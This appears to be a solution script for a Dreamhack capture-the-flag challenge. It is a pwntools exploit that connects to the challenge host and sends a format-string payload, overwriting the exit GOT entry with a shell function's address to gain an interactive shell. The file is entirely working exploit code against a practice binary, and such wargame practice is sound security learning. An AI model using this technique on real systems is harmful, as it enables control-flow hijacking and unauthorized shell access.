from pwn import *

# p = process('./basic_exploitation_002')
p = remote('host1.dreamhack.games', 15251)

exit_got = 0x804a024
shell_addr = 0x08048609

shell_addr_low = shell_addr & 0xffff
shell_addr_high = (shell_addr & 0xffff0000) >> 16

log.info(hex(shell_addr_low))
log.info(hex(shell_addr_high))

payload = p32(exit_got) + p32(exit_got + 2)
payload += b'%' + str(shell_addr_low - len(payload)).encode() + b'c%1$ln'
payload += b'%' + str(0x10000 + shell_addr_high - shell_addr_low).encode() + b'c%2$ln'

p.sendline(payload)

p.interactive()